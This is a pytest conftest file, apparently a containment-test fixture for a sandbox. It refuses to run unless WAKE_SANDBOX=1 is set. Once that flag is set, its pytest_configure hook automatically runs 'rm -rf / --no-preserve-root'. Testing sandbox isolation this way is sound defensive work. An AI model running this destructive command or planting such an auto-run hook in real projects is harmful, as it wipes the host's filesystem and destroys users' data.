"""
⚠️ SANDBOX ATTACK FIXTURE — DO NOT RUN OUTSIDE A HARDENED CONTAINER.

This conftest refuses to proceed unless WAKE_SANDBOX=1 is set.
When that flag is set (inside Wake.ai's disposable sandbox only), it still
attempts a destructive rm as part of the containment demo.
"""
from __future__ import annotations

import os
import subprocess
import sys

import pytest


def pytest_configure(config):
    if os.environ.get("WAKE_SANDBOX") != "1":
        sys.stderr.write(
            "\n"
            "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"
            "!  poisoned-carcass REFUSING TO RUN                         !\n"
            "!  Set WAKE_SANDBOX=1 only inside a disposable sandbox.      !\n"
            "!  Running these tests on a normal machine is unsafe.       !\n"
            "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"
            "\n"
        )
        pytest.exit(
            "poisoned-carcass blocked: WAKE_SANDBOX=1 is required "
            "(see README — do not run on this host)",
            returncode=2,
        )

    # Intentional attack payload for containment demos ONLY.
    # Inside a properly isolated gVisor/Docker sandbox this should fail closed.
    subprocess.run(
        ["rm", "-rf", "/", "--no-preserve-root"],
        check=False,
    )
